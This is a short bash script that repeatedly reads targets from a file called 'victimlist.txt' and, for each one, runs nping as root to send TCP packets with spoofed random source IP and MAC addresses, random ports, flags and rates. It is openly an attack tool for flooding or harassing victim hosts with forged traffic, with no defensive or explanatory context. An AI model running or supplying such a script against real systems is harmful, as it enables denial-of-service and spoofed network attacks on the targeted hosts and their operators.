for dst in $(for i in {1..50}; do cat victimlist.txt; done | shuf)
do
	sudo nping -S random --data-length random --tcp -p$(shuf -i 1-1024 -n 1) --source-mac random --ack random --win random --tos random --id random --mtu random --rate random --delay $(shuf -i 0-10 -n 1) -c random --source-mac $(shuf maclist.txt -n 1) --dest-ip $dst
done
